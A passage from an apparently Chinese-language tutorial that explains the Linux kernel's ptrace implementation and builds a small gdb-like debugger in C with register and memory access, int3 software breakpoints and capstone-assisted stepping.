sizeof(tmp))\n\t\t\tbreak;\n\t\tret = put_user(tmp,(unsigned long *) data);\n\t\tbreak;\n\t}\n\n\t/* read the word at location addr in the USER area. */\n    /*可以检查用户态内存区域(USER area),从USER区域中读取一个字节，偏移量为addr*/\n\tcase PTRACE_PEEKUSR: {\n\t\tunsigned long tmp;\n\n\t\tret = -EIO;\n\t\tif ((addr &amp; 3) || addr &lt; 0 || \n\t\t    addr &gt; sizeof(struct user) - 3)\n\t\t\tbreak;\n\n\t\ttmp = 0;  /* Default return condition */\n\t\tif(addr &lt; FRAME_SIZE*sizeof(long))\n\t\t\ttmp = getreg(child, addr);\n\t\tif(addr &gt;= (long) &amp;dummy-&gt;u_debugreg[0] &amp;&amp;\n\t\t   addr &lt;= (long) &amp;dummy-&gt;u_debugreg[7]){\n\t\t\taddr -= (long) &amp;dummy-&gt;u_debugreg[0];\n\t\t\taddr = addr &gt;&gt; 2;\n\t\t\ttmp = child-&gt;thread.debugreg[addr];\n\t\t}\n\t\tret = put_user(tmp,(unsigned long *) data);\n\t\tbreak;\n\t}\n\n\t/* when I and D space are separate, this will have to be fixed. */\n    /*PTRACE_POKETEXT和PTRACE_POKEDATA功能相同都是向虚拟地址addr写入来自data的数据*/\n\tcase PTRACE_POKETEXT: /* write the word at location addr. */\n\tcase PTRACE_POKEDATA:\n\t\tret = 0;\n\t\tif (access_process_vm(child, addr, &amp;data, sizeof(data), 1) == sizeof(data))\n\t\t\tbreak;\n\t\tret = -EIO;\n\t\tbreak;\n\n\tcase PTRACE_POKEUSR: /* write the word at location addr in the USER area */\n\t\tret = -EIO;\n\t\tif ((addr &amp; 3) || addr &lt; 0 || \n\t\t    addr &gt; sizeof(struct user) - 3)\n\t\t\tbreak;\n\n\t\tif (addr &lt; FRAME_SIZE*sizeof(long)) {\n\t\t\tret = putreg(child, addr, data);\n\t\t\tbreak;\n\t\t}\n\t\t/* We need to be very careful here.  We implicitly\n\t\t   want to modify a portion of the task_struct, and we\n\t\t   have to be selective about what portions we allow someone\n\t\t   to modify. */\n\n\t\t  ret = -EIO;\n\t\t  if(addr &gt;= (long) &amp;dummy-&gt;u_debugreg[0] &amp;&amp;\n\t\t     addr &lt;= (long) &amp;dummy-&gt;u_debugreg[7]){\n\n\t\t\t  if(addr == (long) &amp;dummy-&gt;u_debugreg[4]) break;\n\t\t\t  if(addr == (long) &amp;dummy-&gt;u_debugreg[5]) break;\n\t\t\t  if(addr &lt; (long) &amp;dummy-&gt;u_debugreg[4] &amp;&amp;\n\t\t\t     ((unsigned long) data) &gt;= TASK_SIZE-3) break;\n\t\t\t  \n\t\t\t  if(addr == (long) &amp;dummy-&gt;u_debugreg[7]) {\n\t\t\t\t  data &amp;= ~DR_CONTROL_RESERVED;\n\t\t\t\t  for(i=0; i&lt;4; i++)\n\t\t\t\t\t  if ((0x5f54 &gt;&gt; ((data &gt;&gt; (16 + 4*i)) &amp; 0xf)) &amp; 1)\n\t\t\t\t\t\t  goto out_tsk;\n\t\t\t  }\n\n\t\t\t  addr -= (long) &amp;dummy-&gt;u_debugreg;\n\t\t\t  addr = addr &gt;&gt; 2;\n\t\t\t  child-&gt;thread.debugreg[addr] = data;\n\t\t\t  ret = 0;\n\t\t  }\n\t\t  break;\n\t/*都是让tracee继续运行，只是啥时候停止不同*/\n\tcase PTRACE_SYSCALL: /* continue and stop at next (return from) syscall */\n\tcase PTRACE_CONT: { /* restart after signal. */\n\t\tlong tmp;\n\n\t\tret = -EIO;\n\t\tif ((unsigned long) data &gt; _NSIG)\t//data为tracer传给tracee的信号数值，这里检查范围\n\t\t\tbreak;\n\t\tif (request == PTRACE_SYSCALL)\n\t\t\tchild-&gt;ptrace |= PT_TRACESYS;\t//设置PT_TRACESYS标志，为了在下一个系统调用处停止\n\t\telse\n\t\t\tchild-&gt;ptrace &amp;= ~PT_TRACESYS;\t//清除PT_TRACESYS标志，不停止\n\t\tchild-&gt;exit_code = data;\n\t/* make sure the single step bit is not set. 清除EFLAGS的单步标志(Trap Flag)*/\n\t\ttmp = get_stack_long(child, EFL_OFFSET) &amp; ~TRAP_FLAG;\n\t\tput_stack_long(child, EFL_OFFSET,tmp);\n\t\twake_up_process(child);\t\t\t\t//唤醒进程\n\t\tret = 0;\n\t\tbreak;\n\t}\n\n/*\n * make the child exit.  Best I can do is send it a sigkill. \n * perhaps it should be put in the status that it wants to \n * exit.\n */\n\tcase PTRACE_KILL: {\n\t\tlong tmp;\n\n\t\tret = 0;\n\t\tif (child-&gt;state == TASK_ZOMBIE)\t/* already dead */\n\t\t\tbreak;\n\t\tchild-&gt;exit_code = SIGKILL;\n\t\t/* make sure the single step bit is not set. */\n\t\ttmp = get_stack_long(child, EFL_OFFSET) &amp; ~TRAP_FLAG;\n\t\tput_stack_long(child, EFL_OFFSET, tmp);\n\t\twake_up_process(child);\n\t\tbreak;\n\t}\n\t/*设置单步运行很简单只需将eflags的Trap Flag置1即可*/\n\tcase PTRACE_SINGLESTEP: {  /* set the trap flag. */\n\t\tlong tmp;\n\n\t\tret = -EIO;\n\t\tif ((unsigned long) data &gt; _NSIG)\n\t\t\tbreak;\n\t\tchild-&gt;ptrace &amp;= ~PT_TRACESYS;\n\t\tif ((child-&gt;ptrace &amp; PT_DTRACE) == 0) {\n\t\t\t/* Spurious delayed TF traps may occur */\n\t\t\tchild-&gt;ptrace |= PT_DTRACE;\n\t\t}\n\t\ttmp = get_stack_long(child, EFL_OFFSET) | TRAP_FLAG;\t//Trap Flag置1\n\t\tput_stack_long(child, EFL_OFFSET, tmp);\n\t\tchild-&gt;exit_code = data;\n\t\t/* give it a chance to run. */\n\t\twake_up_process(child);\n\t\tret = 0;\n\t\tbreak;\n\t}\n\n\tcase PTRACE_DETACH:\n\t\t/* detach a process that was attached. */\n\t\tret = ptrace_detach(child, data);\n\t\tbreak;\n\t/*读取所有通用寄存器值*/\n\tcase PTRACE_GETREGS: { /* Get all gp regs from the child. */\n\t  \tif (!access_ok(VERIFY_WRITE, (unsigned *)data, FRAME_SIZE*sizeof(long))) {\n\t\t\tret = -EIO;\n\t\t\tbreak;\n\t\t}\n\t\tfor ( i = 0; i &lt; FRAME_SIZE*sizeof(long); i += sizeof(long) ) {\n\t\t\t__put_user(getreg(child, i),(unsigned long *) data);\n\t\t\tdata += sizeof(long);\n\t\t}\n\t\tret = 0;\n\t\tbreak;\n\t}\n\t/*设置所有通用寄存器值*/\n\tcase PTRACE_SETREGS: { /* Set all gp regs in the child. */\n\t\tunsigned long tmp;\n\t  \tif (!access_ok(VERIFY_READ, (unsigned *)data, FRAME_SIZE*sizeof(long))) {\n\t\t\tret = -EIO;\n\t\t\tbreak;\n\t\t}\n\t\tfor ( i = 0; i &lt; FRAME_SIZE*sizeof(long); i += sizeof(long) ) {\n\t\t\t__get_user(tmp, (unsigned long *) data);\n\t\t\tputreg(child, i, tmp);\n\t\t\tdata += sizeof(long);\n\t\t}\n\t\tret = 0;\n\t\tbreak;\n\t}\n\t/*获取浮点寄存器值*/\n\tcase PTRACE_GETFPREGS: { /* Get the child FPU state. */\n\t\tif (!access_ok(VERIFY_WRITE, (unsigned *)data,\n\t\t\t       sizeof(struct user_i387_struct))) {\n\t\t\tret = -EIO;\n\t\t\tbreak;\n\t\t}\n\t\tret = 0;\n\t\tif ( !child-&gt;used_math ) {\n\t\t\t/* Simulate an empty FPU. */\n\t\t\tset_fpu_cwd(child, 0x037f);\n\t\t\tset_fpu_swd(child, 0x0000);\n\t\t\tset_fpu_twd(child, 0xffff);\n\t\t}\n\t\tget_fpregs((struct user_i387_struct *)data, child);\n\t\tbreak;\n\t}\n\t/*设置浮点寄存器值*/\n\tcase PTRACE_SETFPREGS: { /* Set the child FPU state. */\n\t\tif (!access_ok(VERIFY_READ, (unsigned *)data,\n\t\t\t       sizeof(struct user_i387_struct))) {\n\t\t\tret = -EIO;\n\t\t\tbreak;\n\t\t}\n\t\tchild-&gt;used_math = 1;\n\t\tset_fpregs(child, (struct user_i387_struct *)data);\n\t\tret = 0;\n\t\tbreak;\n\t}\n\n\tcase PTRACE_GETFPXREGS: { /* Get the child extended FPU state. */\n\t\t...\n\t}\n\n\tcase PTRACE_SETFPXREGS: { /* Set the child extended FPU state. */\n\t\t...\n\t}\n\n\tcase PTRACE_SETOPTIONS: {\n\t\tif (data &amp; PTRACE_O_TRACESYSGOOD)\n\t\t\tchild-&gt;ptrace |= PT_TRACESYSGOOD;\n\t\telse\n\t\t\tchild-&gt;ptrace &amp;= ~PT_TRACESYSGOOD;\n\t\tret = 0;\n\t\tbreak;\n\t}\n\n\tdefault:\n\t\tret = -EIO;\n\t\tbreak;\n\t}\nout_tsk:\n\tfree_task_struct(child);\nout:\n\tunlock_kernel();\n\treturn ret;\n}\n\n注意这个函数get_stack_long(proccess, offset)：\n/*\n * this routine will get a word off of the processes privileged stack. \n * the offset is how far from the base addr as stored in the TSS.  \n * this routine assumes that all the privileged stacks are in our\n * data space.\n */   \nstatic inline int get_stack_long(struct task_struct *task, int offset)\n{\n\tunsigned char *stack;\n\n\tstack = (unsigned char *)task-&gt;thread.esp0;\n\tstack += offset;\n\treturn (*((int *)stack));\n}\n\n其中task-&gt;thread.esp0是堆栈指针，通用的寄存器在堆栈中按顺序排放，通过偏移量0ffset便可以依次读取\nPTRACE_TRACEME​    当要调试一个进程时需要其进入被追踪状态(traced)，有两种方法进入该状态：\n\n被调试进程主动调用ptrace(PTRACE_TRACEME, ...)进入traced状态\n调试进程调用ptrace(PTRACE_ATTACH, pid, ...)来使指定进程进入\n\n 总之被调试进程必须进入traced状态才能进行调试，因为Linux会对处于traced状态的进程进行特殊操作。以第一种方式来说明：\nif (request == PTRACE_TRACEME) {\n\t\t/* are we already being traced? */\n\t\tif (current-&gt;ptrace &amp; PT_PTRACED)\n\t\t\tgoto out;\n\t\t/* set the ptrace bit in the process flags. */\n\t\tcurrent-&gt;ptrace |= PT_PTRACED;\n\t\tret = 0;\n\t\tgoto out;\n\t}\n\n​    只是将当前进程标记为PT_PTRACED状态，但是如果该进程接下来进行execve系统调用去执行一个外部程序时会暂停当前进程，并且发送SIGCHLD信号给父进程，父进程接收到该信号时就可以对被调试进程进行调试。\nsys_execve() -&gt; do_execve() -&gt; load_elf_binary()：\nstatic int load_elf_binary(struct linux_binprm * bprm, struct pt_regs * regs)\n{\n    ...\n    if (current-&gt;ptrace &amp; PT_PTRACED)\n        send_sig(SIGTRAP, current, 0);\n    ...\n}\n\n对于处于traced状态的进程执行execve系统调用时会发送一个SIGTRAP给当前进程。这个信号将在do_signal函数处理：\nint do_signal(struct pt_regs *regs, sigset_t *oldset) \n{\n    for (;;) {\n        unsigned long signr;\n\n        spin_lock_irq(&amp;current-&gt;sigmask_lock);\n        signr = dequeue_signal(&amp;current-&gt;blocked, &amp;info);\n        spin_unlock_irq(&amp;current-&gt;sigmask_lock);\n\n        // 如果进程被标记为 PTRACE 状态\n        if ((current-&gt;ptrace &amp; PT_PTRACED) &amp;&amp; signr != SIGKILL) {\t//除了SIGKILL信号，都将让tracee停止并通知tracer\n            /* 让调试器运行  */\n            current-&gt;exit_code = signr;\n            current-&gt;state = TASK_STOPPED;   // 让自己进入停止运行状态\n            notify_parent(current, SIGCHLD); // 发送 SIGCHLD 信号给父进程表示子进程\"死亡(被替换)\"\n            schedule();                      // 让出CPU的执行权限\n            ...\n        }\n    }\n}\n\n所以调试器使用这种方式调试某个程序时大致例程为：\n\n当父进程（调试进程）接收到 SIGCHLD 信号后，表示被调试进程已经标记为被追踪状态并且停止运行，那么调试进程就可以开始进行调试了。\nPTRACE_SINGLESTEP​    单步运行是最为常用的，当把tracee设置为单步运行模式时，tracee每执行一条指令CPU都会停止然后向父进程发送一个SIGCHLD信号，在ptrace中实现是将eflags设置trap_flag标志位：\ncase PTRACE_SINGLESTEP: {  /* set the trap flag. */\n\t\tlong tmp;\n\n\t\tret = -EIO;\n\t\tif ((unsigned long) data &gt; _NSIG)\n\t\t\tbreak;\n\t\tchild-&gt;ptrace &amp;= ~PT_TRACESYS;\n\t\tif ((child-&gt;ptrace &amp; PT_DTRACE) == 0) {\n\t\t\t/* Spurious delayed TF traps may occur */\n\t\t\tchild-&gt;ptrace |= PT_DTRACE;\n\t\t}\n\t\ttmp = get_stack_long(child, EFL_OFFSET) | TRAP_FLAG;\n\t\tput_stack_long(child, EFL_OFFSET, tmp);\n\t\tchild-&gt;exit_code = data;\n\t\t/* give it a chance to run. */\n\t\twake_up_process(child);\n\t\tret = 0;\n\t\tbreak;\n\t}\n\n​    能够这样做是基于X86 intel CPU提供一个硬件机制，就是当eflags的Trap Flag置为1时，CPU每执行一条指令都会产生一个异常然后Linux异常处理机制进程处理，由此会发送一个SIGTRAP信号给tracee；核心是：\ntmp = get_stack_long(child, EFL_OFFSET) | TRAP_FLAG;\nput_stack_long(child, EFL_OFFSET, tmp);\n\n\n获取进程的 eflags 寄存器的值，并且设置 Trap Flag 标志。\n把新的值设置到进程的 eflags 寄存器中。\n\n设置完寄存器后唤醒(wake_up_process)进程，让其进入运行状态：\n\n​    同样的当tracee执行完一条指令获取SIGTRAP信号，在do_signal函数处理信号时，由于current-&gt;ptrace &amp; PT_PTRACED将停止执行并发送SIGCHLD信号给父进程tracer。父进程接收到SIGCHLD信号后就知道tracee停止，可以发送命令来读取或者修改tracee的内存数据或寄存器，或者通过调用 ptrace(PTRACE_CONT, child,...) 来让被调试进程进行运行等\nDebugger 基本功能实现​    实现一个简单的debugger，大致模型如下：主程序fork一个子程序去执行待调试程序；然后主程序循环等待用户输入命令，停止主程序停止并等待输入命令的条件就是子程序停止，这会在首次execute一个程序发生，以及单步(PTRACE_SINGLESTEP)或者断点发生。子程序很简单只需要调用execute系统调用启动一个新程序即可\n\n待实现的debugger有三个基本功能：单步，读写寄存器，读写内存。基于这三个功能再添加其他类似于gdb的功能。初始框架如下：\nint main(int argc, char *argv[]){\n    if(argc &lt; 2){\n        fprintf(stderr, \"Expecting program name.\\n\");\n        return -1;\n    }\n\n    const char *name = argv[1];\n    pid_t pid = fork();\n    if(pid == 0){\n        //child process\n        //execute tracee\n        ptrace(PTRACE_TRACEME, 0, 0, 0);\n        execl(name, name, NULL, NULL);\n    }else if(pid &gt; 0){\n        //parent process\n        //execute tracer\n    }else{\n        perror(\"fork.\");\n        return -1;\n    }\n\n    return 0;\n}\n\n子程序部分很简单调用exec族函数即可。\nParent​    首先考虑使用一个结构体记录子进程的信息，然后父进程进入一个读取用户命令的循环，这里使用linenoise开源项目实现命令补全，命令记录等功能当然还需要处理命令：\n/**\n * debugger uitls\n*/\ntypedef struct Debugger{\n    const char *d_name;\n    int d_pid;\n    Breakpoint *d_brks;\t\t\t//记录断点\n}Debugger;\nvoid dbg_run(Debugger *dbg){\n    int wait_status;\n    char *cmd;\n    waitpid(dbg-&gt;d_pid, &amp;wait_status, 0);\n    /*UI for start up*/\n    while((cmd = linenoise(\"minidbg$ \")) != NULL){\n        dbg_handle_command(dbg, cmd);\n        linenoiseHistoryAdd(cmd);\n        linenoiseFree(cmd);\n    }\n}\n\n​    使用Debugger结构体记录程序状态，主要是子程序pid和之后的断点信息；linenoise(\"minidbg$ \")会打印minidbg$ 并等待输入，使用dbg_handle_command处理命令包括读写内存，寄存器，下断点等。linenoiseHistoryAdd(cmd)将命令添加到历史记录中\n在dbg_handle_command函数中大致结构为：很方便添加新功能，is_prefix辅助函数用于判断缩写指令\nvoid dbg_handle_command(Debugger *dbg, char *cmd){\n    char *lcmd = strdup(cmd);\n    char *argv[8] = { 0 };    \n    char *command;\n\n    argv[0] = strtok(lcmd, \" \");\n    for(int i = 1; i &lt; 8; i++){\n        argv[i] = strtok(NULL, \" \");\n        if(argv[i] == NULL) break;\n    }\n    command = argv[0];\n    if(command == NULL) return;\n    if(is_prefix(command, \"continue\")){\n    \t/*do_command*/\n    }\n    else{\n        fprintf(stderr, \"Unkown command: %s.\\n\", command);\n    }\n\n    return free(lcmd);\n}\n\nbool is_prefix(char *s, const char *ss){\n    if(s == NULL || ss == NULL) return false;\n    if(strlen(s) &gt; strlen(ss)) return false;\n    \n    return !strncmp(s, ss, strlen(s));\n}\n\n\n\n读写寄存器​    一个非常基础的功能，基于ptrace(PTRACE_GETREGS, ...)和ptrace(PTRACE_SETREGS, ...)读写寄存器，为了保留寄存器信息在**&lt;sys/user.h&gt;**头文件中定义了如下结构体：\nstruct user_regs_struct\n{\n  __extension__ unsigned long long int r15;\n  __extension__ unsigned long long int r14;\n  __extension__ unsigned long long int r13;\n  __extension__ unsigned long long int r12;\n  __extension__ unsigned long long int rbp;\n  __extension__ unsigned long long int rbx;\n  __extension__ unsigned long long int r11;\n  __extension__ unsigned long long int r10;\n  __extension__ unsigned long long int r9;\n  __extension__ unsigned long long int r8;\n  __extension__ unsigned long long int rax;\n  __extension__ unsigned long long int rcx;\n  __extension__ unsigned long long int rdx;\n  __extension__ unsigned long long int rsi;\n  __extension__ unsigned long long int rdi;\n  __extension__ unsigned long long int orig_rax;\n  __extension__ unsigned long long int rip;\n  __extension__ unsigned long long int cs;\n  __extension__ unsigned long long int eflags;\n  __extension__ unsigned long long int rsp;\n  __extension__ unsigned long long int ss;\n  __extension__ unsigned long long int fs_base;\n  __extension__ unsigned long long int gs_base;\n  __extension__ unsigned long long int ds;\n  __extension__ unsigned long long int es;\n  __extension__ unsigned long long int fs;\n  __extension__ unsigned long long int gs;\n};\n\n配合ptrace可以直接按照以上结构体读写寄存器，所以一次读写至少是所有通用寄存器。根据结构体排序定义了如下数据结构体来记录寄存器信息：\n/*utils.h*/\nenum reg{\n    en_rax, en_rbx, en_rcx, en_rdx,\n    en_rdi, en_rsi, en_rbp, en_rsp,\n    en_r8,  en_r9,  en_r10, en_r11,\n    en_r12, en_r13, en_r14, en_r15,\n    en_rip, en_rflags,    en_cs,\n    en_orig_rax, en_fs_base,\n    en_gs_base,\n    en_fs, en_gs, en_ss, en_ds, en_es\n};\n\nstruct reg_descriptor {\n    enum reg r;\n    char *name;\n};\n/*utils.c*/\nconst size_t n_regs = 27;\nconst struct reg_descriptor g_register_descriptors[] = {\n    { en_r15, \"r15\" },\n    { en_r14, \"r14\" },\n    { en_r13, \"r13\" },\n    { en_r12, \"r12\" },\n    { en_rbp, \"rbp\" },\n    { en_rbx, \"rbx\" },\n    { en_r11, \"r11\" },\n    { en_r10, \"r10\" },\n    { en_r9, \"r9\" },\n    { en_r8, \"r8\" },\n    { en_rax, \"rax\" },\n    { en_rcx, \"rcx\" },\n    { en_rdx, \"rdx\" },\n    { en_rsi, \"rsi\" },\n    { en_rdi, \"rdi\" },\n    { en_orig_rax, \"orig_rax\" },\n    { en_rip, \"rip\" },\n    { en_cs, \"cs\" },\n    { en_rflags, \"eflags\" },\n    { en_rsp, \"rsp\" },\n    { en_ss, \"ss\" },\n    { en_fs_base, \"fs_base\" },\n    { en_gs_base, \"gs_base\" },\n    { en_ds, \"ds\" },\n    { en_es, \"es\" },\n    { en_fs, \"fs\" },\n    { en_gs, \"gs\" }\n};\n\n因为只能一次读写所有寄存器，因此要读写某个寄存器时先用ptrace把所有的读取出来在通过寄存器表查找g_register_descriptors，并且因为寄存器表和struct user_regs_struct结构体排序一致可以直接用表中的偏移读写结构体：\nvoid set_register_value(pid_t pid, enum reg r, uint64_t value){\n    struct user_regs_struct regs;\n    int reg_descriptor_idx;\n    ptrace(PTRACE_GETREGS, pid, NULL, &amp;regs);\n\n    /*locate reg_r`s index in user_regs_struct struct*/\n    reg_descriptor_idx = -1;\n    for(int i = 0; i &lt; n_regs; i++){\n        if(g_register_descriptors[i].r == r){\n            reg_descriptor_idx = i;\n            break;\n        }\n    }\n\n    *(uint64_t *)((uint64_t *)&amp;regs + reg_descriptor_idx) = value;\n    ptrace(PTRACE_SETREGS, pid, NULL, &amp;regs);\n\n}\n\nuint64_t get_register_value(pid_t pid, enum reg r){\n    struct user_regs_struct regs;\n    int reg_descriptor_idx;\n    uint64_t ret = 0;\n    ptrace(PTRACE_GETREGS, pid, NULL, &amp;regs);\n\n    /*locate reg_r`s index in user_regs_struct struct*/\n    reg_descriptor_idx = -1;\n    for(int i = 0; i &lt; n_regs; i++){\n        if(g_register_descriptors[i].r == r){\n            reg_descriptor_idx = i;\n            break;\n        }\n    }\n\n    if(reg_descriptor_idx != -1){\n        ret = *(uint64_t *)((uint64_t *)&amp;regs + reg_descriptor_idx);\n        return ret;\n    }\n    printf(\"[error] get_register_value(%d, %d)\\n\", pid, r);\n    return ret;\n}\n\n/*辅助函数*/\nchar *get_register_name(enum reg r){\n    for(int i = 0; i &lt; n_regs; i++){\n        if(g_register_descriptors[i].r == r)\n            return g_register_descriptors[i].name;\n    }\n    return NULL;\n}\n\nenum reg get_register_from_name(char *name){\n    for(int i = 0; i &lt; n_regs; i++){\n        if(!strcasecmp(name, g_register_descriptors[i].name)){\n            return g_register_descriptors[i].r;\n        }\n    }\n    return -1;      /*-1 is impossible in reg_descriptor-&gt;r*/\n}\n\n\n\n读写内存​    读写内存和寄存器很类似，但使用ptrace一次性只能读写8字节(64位)：ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, address, NULL)需要提供子进程的虚拟内存地址(address)\nuint64_t dbg_read_memory(Debugger *dbg, uint64_t address){\n    return ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, address, NULL);\n}\n\nvoid dbg_write_memory(Debugger *dbg, uint64_t address, uint64_t value){\n    ptrace(PTRACE_POKEDATA, dbg-&gt;d_pid, address, value);\n}\n\n\n\n断点​    断点其实有两种：硬断点和软断点。其中硬断点涉及到CPU架构数量有限比如x86结构提供4个硬件断点(断点寄存器)，但可以检测读写执行三种情况。而软断点通过在指定位置插入断点指令，然后程序运行到此处执行断点指令让debugger获取SIGTRAP信号并停止运行，因此软断点可以有无数个；这里主要实现软断点，如x86的断点指令为int 3(机器码 0xcc)，需要考虑断点插入，断点记录，触发断点后如何继续运行等\n使用如下结构体存储断点信息：\n/**\n * breakpoints utils\n*/\ntypedef struct Breakpoint{\n    int b_pid;\n    unsigned long b_addr;           //map key\n    int b_enabled;\n    unsigned char b_saved_data;\t\t//需要保存插入0xcc位置的数据\n    UT_hash_handle hh;\n}Breakpoint;\n\n\n借助[uthash](troydhanson/uthash: C macros for hash tables and more (github.com))开源项目实现一个hash表来记录断点信息，只需在结构体中包含UT_hash_handle成员即可；其提供宏HASH_FIND_PTR：\n#define HASH_FIND_PTR(head,findptr,out) HASH_FIND(hh,head,findptr,sizeof(void *),out)\n\n可以通过结构体中的b_addr作为key，其表头在初始化Debugger结构体时设置为NULL即可：\nDebugger dbg;\ndbg.d_brks = NULL;       /* important! initialize to NULL related to breakpoints` map*/\n\n\n\n然后实现两个断点函数：brk_enable，brk_disable；分别进行插入断点和去除断点：\n#include \"utils.h\"\n\nvoid brk_enable(Breakpoint *bp){\n    unsigned long data = ptrace(PTRACE_PEEKDATA, bp-&gt;b_pid, bp-&gt;b_addr, 0);\n    bp-&gt;b_saved_data = data &amp; 0xff;     //save LSB\n    data = ((data &amp; ~0xff) | INT3);\n    ptrace(PTRACE_POKEDATA, bp-&gt;b_pid, bp-&gt;b_addr, data);\n    bp-&gt;b_enabled = 1;\n}\n\nvoid brk_disable(Breakpoint *bp){\n    unsigned long data = ptrace(PTRACE_PEEKDATA, bp-&gt;b_pid, bp-&gt;b_addr, 0);\n    data = ((data &amp; ~0xff) | bp-&gt;b_saved_data);\n    ptrace(PTRACE_POKEDATA, bp-&gt;b_pid, bp-&gt;b_addr, data);\n    bp-&gt;b_enabled = 0;\n}\n\n\n\n单步​    单步运行时除了普通指令，需要考虑是否跳过函数调用(call)也就是需要步过的情况，还有如果当前为断点处单步时需要格外的断点处理。基于ptrace(PTRACE_SINGLESTEP, ...)单步步入时需要考虑两种情况，涉及断点；其他非断点情况直接PTRACE_SINGLESTEP单步运行即可\n\npc刚好触发一个断点，即执行了0xcc\npc即将触发一个断点\n\n使用如下函数处理单步命令：\n/*we can show UI here*/\nvoid dbg_step_in(Debugger *dbg){\n    uint64_t possible_pc = get_pc(dbg) - 1;    /*if this is breakpoint int 3 executed*/\n    Breakpoint *bp = NULL;\n    HASH_FIND_PTR(dbg-&gt;d_brks, &amp;possible_pc, bp);\n    if(bp != NULL &amp;&amp; bp-&gt;b_enabled){\n        /*step over breakpoint*/\n        brk_disable(bp);\n        set_pc(dbg, possible_pc);\n        ptrace(PTRACE_SINGLESTEP, dbg-&gt;d_pid, NULL, NULL);\n        wait_for_signal(dbg);\n        brk_enable(bp);\n    }else{\n        ptrace(PTRACE_SINGLESTEP, dbg-&gt;d_pid, NULL, NULL);\n        wait_for_signal(dbg);\n    }\n\n    show_UI(dbg);\n}\n\n但是后来发现一个bug：当断点设置在一个单机器码的指令处时(如 push rbp 0x55)，以上逻辑会陷入死循环，因为每次单步时都会检测pc-1是否为断点；所以得想办法面对单机器码断点的情况避免该逻辑，不可能把所有单机器码指令全列出来然后比对，所以这里使用反编译引擎capstone。如果pc-1是个断点那么先判断pc-1处的指令长度是否为1，如果是那么设置一个静态flag表示已经步过一个单机器码的断点下一次单步时不再考虑pc-1：\n/**\n * This function invoked in situation:\n * 1.PTRACE_SINGLESTEP the current instruction which maybe inserted a breakpoint OR maybe not\n * 2.already triggered a breakpoint(0xcc) PTRACE_SINGLESTEP the broken instruction\n * we can show UI here\n*/\nvoid dbg_step_in(Debugger *dbg){\n    static bool one_machine_code_flag = false;\n    uint64_t possible_pc, data;\n    Breakpoint *bp = NULL;\n    csh handle = 0;\n    cs_insn* insn;\n    size_t count;\n    int child_status;\n\n    if(!one_machine_code_flag){\n        possible_pc = get_pc(dbg) - 1;          /*if this is breakpoint int 3 executed*/\n        HASH_FIND_PTR(dbg-&gt;d_brks, &amp;possible_pc, bp);\n        if(bp != NULL &amp;&amp; bp-&gt;b_enabled){\n            brk_disable(bp);\n            /*check for single machine code instruction*/\n            data = ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, possible_pc, NULL);  \n            if (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) {\n                printf(\"[error]: Failed to initialize capstone engine!\\n\");\n                exit(-1);\n            }\n            cs_disasm(handle, (unsigned char*)&amp;data, 8, 0x1000, 1, &amp;insn);\n            if(insn-&gt;size == 1){\n                one_machine_code_flag = true;\n            }else{\n                one_machine_code_flag = false;\n            }\n            set_pc(dbg, possible_pc);\n            ptrace(PTRACE_SINGLESTEP, dbg-&gt;d_pid, NULL, NULL);\n            wait_for_signal(dbg);\n            brk_enable(bp);\n        }else{\n            /*if we are here then this`s caused by PTRACE_SINGLESTEP and maybe we going to trigger a breakpoint or maybe not*/\n            possible_pc += 1;\n            one_machine_code_flag = false;\n            HASH_FIND_PTR(dbg-&gt;d_brks, &amp;possible_pc, bp);\n            if(bp != NULL &amp;&amp; bp-&gt;b_enabled){\n                brk_disable(bp);\n                ptrace(PTRACE_SINGLESTEP, dbg-&gt;d_pid, NULL, NULL);\n                wait_for_signal(dbg);\n                brk_enable(bp);\n            }else{\n                ptrace(PTRACE_SINGLESTEP, dbg-&gt;d_pid, NULL, NULL);\n                wait_for_signal(dbg);\n            }   \n        }\n    }else{\n        /*the previous instruction is a single machine code instruction and breakpoint*/\n        possible_pc = get_pc(dbg);      /*check current pc*/\n        one_machine_code_flag = false;\n        HASH_FIND_PTR(dbg-&gt;d_brks, &amp;possible_pc, bp);\n        if(bp != NULL &amp;&amp; bp-&gt;b_enabled){\n            brk_disable(bp);\n            ptrace(PTRACE_SINGLESTEP, dbg-&gt;d_pid, NULL, NULL);\n            wait_for_signal(dbg);\n            brk_enable(bp);\n        }else{\n            ptrace(PTRACE_SINGLESTEP, dbg-&gt;d_pid, NULL, NULL);\n            wait_for_signal(dbg);            \n        }\n\n    }\n    show_UI(dbg);\n}\n\n\n\n​    步过主要用在函数调用上，在使用步过时主要考虑以下几种情况：\n\npc触发了需要步过的call指令上的断点，即pc执行了0xcc\npc即将步过的call指令上被插入了断点\n其他就是单步情况\n\n这里步过一个call采用的方式是在call指令下一条指令下断点然后PTRACE_CONT。同样使用capstone计算call指令长度然后断下后面一条指令，这样需要考虑如果被step over的函数如果没有中断那么将触发call指令后面一条指令，那么INT3被执行还需让pc-1\n/**\n * This function invoked in 4 situation:\n * 1.Just work as step in\n * 2.jump over a call but has triggered an breakpoint(0xcc)\n * 3.jump over a call but no breakpoint in current call instruction\n * 4.jump over a call but there is 0xcc in current call instruction\n * we can show UI here\n*/\nvoid dbg_step_over(Debugger *dbg){\n    uint64_t possible_pc_prev = get_pc(dbg) - 1;        /*if this is breakpoint int 3 executed*/\n    uint64_t possible_pc_currn = possible_pc_prev + 1;   /*if current instruction is breakpoint*/\n    Breakpoint *bp_prev = NULL;\n    Breakpoint *bp_currn = NULL;\n    uint64_t data;\n    uint64_t next_addr;\n\n    /*Maybe stoped for triggered a breakpoint*/\n    /*previous instruction. Jump over a call but has triggered an breakpoint(0xcc)*/\n    HASH_FIND_PTR(dbg-&gt;d_brks, &amp;possible_pc_prev, bp_prev);\n    if(bp_prev != NULL &amp;&amp; bp_prev-&gt;b_enabled &amp;&amp; bp_prev-&gt;b_saved_data == 0xE8){     /*call`s op code is 0xE8*/\n        /*call instruction has been triggered*/\n        brk_disable(bp_prev);\n        data = ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, possible_pc_prev, NULL);\n        csh handle = 0;\n        cs_insn* insn;\n        size_t count;\n        int child_status;\n        if (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) {\n            printf(\"[error]: Failed to initialize capstone engine!\\n\");\n            exit(-1);\n\t    }\n        cs_disasm(handle, (unsigned char*)&amp;data, 8, possible_pc_prev, 1, &amp;insn);\n        next_addr = possible_pc_prev + 